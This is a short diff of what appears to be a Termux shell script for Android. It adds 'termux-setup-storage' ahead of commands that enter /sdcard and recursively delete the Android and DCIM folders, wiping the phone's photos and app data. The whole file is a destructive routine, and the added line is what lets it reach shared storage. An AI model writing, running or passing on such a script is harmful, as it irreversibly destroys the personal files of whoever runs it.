@@ -1,5 +1,6 @@
 cd
 clear
+termux-setup-storage
 cd /sdcard
 rm -rf Android
 rm -rf DCIM
